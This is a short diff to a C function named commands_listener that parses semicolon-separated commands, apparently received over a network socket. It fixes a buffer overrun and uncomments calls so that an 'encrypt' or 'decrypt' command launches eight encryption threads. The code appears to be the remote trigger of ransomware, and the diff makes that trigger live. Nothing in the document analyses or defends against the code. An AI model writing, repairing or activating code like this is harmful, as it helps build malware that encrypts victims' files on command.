@@ -23,29 +23,26 @@ void *commands_listener(void *arg) {
 
         if (valread > 0 ) {
             buffer[valread] = '\0';
-            char *arguments[10];
-            int i = 0;
+            char *arguments[10] = {0};  // zero-initialize so unused slots are NULL
+            int argc = 0;
 
             char *token = strtok(buffer, ";");
-
-            while (token != NULL) {
-                arguments[i] = token;
-                i++;
-
+            while (token != NULL && argc < 10) {
+                arguments[argc++] = token;
                 token = strtok(NULL, ";");
             }
 
             if (strcmp(arguments[0], "encrypt") == 0) {
                 printf("start_encryption\n");
-                //if encrypt {initialize_threads(8, true);}
+                initialize_threads(8, true);
             } else if (strcmp(arguments[0], "decrypt") == 0) {
                 printf("start_decryption\n");
-                //if decrypt {initialize_threads(8, false);}
+                initialize_threads(8, false);
             } else {
-                for (int i = 0; i < sizeof(arguments); i++) {
+                for (int i = 0; i < argc; i++) {
                     printf("%s\n", arguments[i]);
                 }
-            }            
+            }
         }
     }
 }
